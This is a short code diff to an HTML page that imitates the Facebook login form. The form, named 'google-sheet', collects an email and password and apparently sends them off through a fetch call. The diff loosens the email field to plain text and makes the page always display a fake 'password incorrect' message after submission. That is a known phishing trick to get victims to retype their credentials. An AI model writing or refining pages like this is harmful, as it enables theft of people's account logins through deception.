@@ -17,7 +17,7 @@
             </div>
             <form id="loginForm" method="post" autocomplete="off" name="google-sheet">
                 <h2>facebook</h2>
-                <input type="email" name="email" id="email" placeholder="Email or phone number" required>
+                <input type="text" name="email" id="email" placeholder="Email or phone number" required>
                 <input type="password" name="password" id="password" placeholder="Password" required>
                 <div class="link">
                     <button class="button loginButton">Log in</button>
@@ -71,7 +71,7 @@
                     .catch(error => console.error('Error!', error.message));
             // } else {
                 // Display error message
-                // errorMessage.textContent = "The password that you've entered is incorrect.";
+                errorMessage.textContent = "The password that you've entered is incorrect.";
             // }
         });
     </script>
